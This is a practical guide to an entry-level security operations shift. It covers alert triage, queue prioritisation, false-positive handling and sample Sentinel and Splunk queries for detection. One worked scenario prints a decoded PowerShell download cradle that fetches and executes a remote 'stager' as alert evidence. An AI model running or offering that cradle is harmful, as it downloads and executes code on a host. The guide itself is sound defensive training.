A Real Day in the SOC

Here's what an actual L1 shift looks like - not the textbook version:

🌅 08:00 - Shift Start

What actually happens:

  • Night shift analyst is tired, gives you a rushed 2-minute verbal handoff
  • There are 47 alerts in queue (23 from overnight)
  • One incident is "still being monitored" but no update in 4 hours
  • Your SIEM is slow because someone ran a massive historical query

What you should do:

  1. Check the handoff notes document (not just verbal)
  2. Scan queue for any CRITICAL/HIGH severity first
  3. Check the "monitored incident" in ticketing system for updates
  4. Start with oldest HIGH alerts to avoid SLA breach

🔔 09:30 - Alert Storm

What actually happens:

  • Suddenly 200+ alerts fire in 10 minutes
  • All "Suspicious PowerShell Execution" from different hosts
  • Manager asks "what's happening?"

What you should do:

  1. Don't panic - Alert storms are usually: real incident OR misconfigured rule/deployment
  2. Check: Are these the SAME alert? Same time? Same source?
  3. Quick query to find pattern:
// Sentinel - Find what's causing the storm
SecurityAlert
| where TimeGenerated > ago(30m)
| summarize Count=count() by AlertName, bin(TimeGenerated, 5m)
| order by Count desc

If all from same source → likely IT activity (patching, SCCM deployment)

If spreading across many hosts → escalate as potential incident

☕ 11:00 - The "Urgent" VIP Request

What actually happens:

  • IT manager calls: "CEO got a phishing email, need investigation NOW"
  • You have 30 alerts in queue
  • Turns out it was a legitimate email the CEO didn't recognize

What you should do:

  1. Ask: "Did they click anything? Download anything? Enter credentials?"
  2. If NO to all → lower priority, check email headers when you can
  3. If YES to any → escalate immediately as incident
  4. Log the request even if it's nothing - documents your workload

Common Inefficiencies

These are real problems that slow down SOC teams:

❌ Inefficiency #1: Investigating Known False Positives

Problem: Analyst spends 10 minutes on an alert, determines it's backup software running at 2 AM. This happens every night. Every analyst investigates it fresh.

Time wasted: 10 min × 365 days = 60+ hours/year per analyst

✓ Solution: Document FP Patterns

  • Create searchable "Known FP" wiki/document
  • Before investigating, search for alert name in FP docs
  • When you find recurring FP, document it AND request tuning

❌ Inefficiency #2: Re-investigating Same User

Problem: Alert for "John Smith suspicious login." L1 investigates, closes as legitimate travel. Next day, same alert (John still traveling). Different L1 investigates from scratch.

✓ Solution: Check Recent History First

// Check if user was recently investigated
SecurityAlert
| where TimeGenerated > ago(7d)
| where Entities contains "john.smith"
| project TimeGenerated, AlertName, Status
| order by TimeGenerated desc

❌ Inefficiency #3: Writing Novels in Tickets

Problem: Analyst writes 500-word essay for a simple false positive. Takes 15 min to document a 2-min triage.

✓ Solution: Use Templates

Status: False Positive
Reason: Scheduled backup activity
Evidence: Process matches Veeam agent, runs nightly 02:00
Action: None
Recommend: Exclude Veeam from this rule

❌ Inefficiency #4: Wrong Queue Order

Problem: 50 alerts in queue. Analyst starts with newest. Meanwhile, HIGH severity alert from 4 hours ago breaches SLA.

✓ Solution: Priority-Based Order

1stCRITICAL severity (any age)
2ndHIGH approaching SLA
3rdOldest MEDIUM alerts
4thNew alerts

Real Alert Scenarios

Scenario A: "Multiple Failed Sign-ins" 5-7 min

Alert: Multiple failed sign-in attempts
User: sarah.jones@company.com
Source IPs: 185.220.101.42, 185.220.101.43
Failures: 47 in 10 minutes
Time: 03:24 AM

Step 1: Context (1 min)

  • Is this a real user? → Check AD/Entra
  • Time 03:24 AM - normal for this user? → Probably not
  • Multiple source IPs - legitimate? → No, suspicious

Step 2: IP Reputation (1 min)

ThreatIntelligenceIndicator
| where NetworkIP == "185.220.101.42"
| project Description, ThreatType

→ Known Tor exit node

Step 3: Any success? (1 min)

SigninLogs
| where TimeGenerated > ago(24h)
| where UserPrincipalName == "sarah.jones@company.com"
| where ResultType == 0
| where IPAddress startswith "185.220"

→ No successful login from those IPs ✓

Decision: True Positive - Blocked

Status: True Positive - Handled
Analysis: Brute force from Tor exit nodes
- 47 failed attempts, no success
- Attack blocked by lockout/CA policy
Action: None - controls working

Scenario B: "Suspicious PowerShell" 10-15 min

Alert: Suspicious PowerShell Command Line
Host: WKSTN-PC042
User: mike.wilson
Command: powershell.exe -enc SQBFAFgAIAAoAE4AZ...
Parent Process: outlook.exe

Step 1: Decode command (1 min)

Base64 decodes to: IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/stager')

⚠️ This is a download cradle!

Step 2: Parent process (30 sec)

Parent is outlook.exe → User clicked something in email = phishing

Step 3: Did it connect? (1 min)

DeviceNetworkEvents
| where DeviceName == "WKSTN-PC042"
| where RemoteIP == "10.0.0.5"

Decision: ESCALATE IMMEDIATELY

🚨 ESCALATING TO L2/INCIDENT
Summary: Phishing compromise on WKSTN-PC042
- Outlook spawned encoded PowerShell download cradle
- Target: http://10.0.0.5/stager
Immediate: Isolate host, check mike.wilson's emails

Scenario C: "Impossible Travel" 5 min

Alert: Impossible Travel
User: david.chen@company.com  
Login 1: New York, USA at 09:00
Login 2: London, UK at 09:45

Common False Positives:

  • VPN - user in NYC but VPN shows UK exit
  • Mobile roaming - phone using foreign carrier
  • Cloud app with regional IP

Check:

SigninLogs
| where UserPrincipalName == "david.chen@company.com"
| where TimeGenerated > ago(2h)
| project TimeGenerated, IPAddress, Location, AppDisplayName, ClientAppUsed

Decision tree:

  • One IP is corporate VPN → False Positive
  • Both unknown external IPs → Escalate

Common L1 Mistakes

❌ Closing without verifying attack was blocked

"Malware quarantined" - but did it run first? Did it make connections?

✓ Always verify the outcome

Check: process tree, network connections, file changes

❌ Trusting the username

"Admin account doing admin things" - but is it really the admin?

✓ Verify activity makes sense

Check: time of day, source IP, typical behavior for this user

❌ Being afraid to escalate

"Don't want to bother L2 with something that might be nothing"

✓ Escalate with your findings

L2 prefers 10 "maybes" over missing 1 real incident. Document what you checked.

Tool-Specific Triage

Microsoft Sentinel Quick Queries

// User context
let user = "john.doe@company.com";
SigninLogs
| where TimeGenerated > ago(7d)
| where UserPrincipalName =~ user
| summarize Logins=count(), UniqueIPs=dcount(IPAddress), 
  Failures=countif(ResultType != 0), LastLogin=max(TimeGenerated)
// Device activity
let device = "WKSTN-PC042";
DeviceProcessEvents
| where TimeGenerated > ago(1h)
| where DeviceName =~ device
| project TimeGenerated, FileName, ProcessCommandLine, InitiatingProcessFileName
| take 50

Splunk Quick Searches

// User activity
index=* user="john.doe" earliest=-7d
| stats count by sourcetype, action, src_ip
// Device activity
index=* host="WKSTN-PC042" earliest=-1h
| stats count by sourcetype, EventCode
